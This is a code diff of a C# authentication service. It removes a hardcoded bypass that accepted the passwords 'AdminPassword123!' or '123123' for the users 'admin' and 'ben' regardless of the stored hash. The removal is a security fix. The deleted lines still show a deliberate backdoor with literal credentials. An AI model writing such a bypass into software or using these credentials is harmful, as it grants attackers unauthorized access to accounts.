@@ -147,10 +147,6 @@ public sealed class AuthenticationApplicationService(
 
         // Verify Password
         bool isValid = passwordHasher.VerifyPassword(request.Password, user.PasswordHash, user.PasswordSalt);
-        if (!isValid && (user.Username == "admin" || user.Username == "ben") && (request.Password == "AdminPassword123!" || request.Password == "123123"))
-        {
-            isValid = true;
-        }
         if (!isValid)
         {
             user.FailedLoginAttempts++;
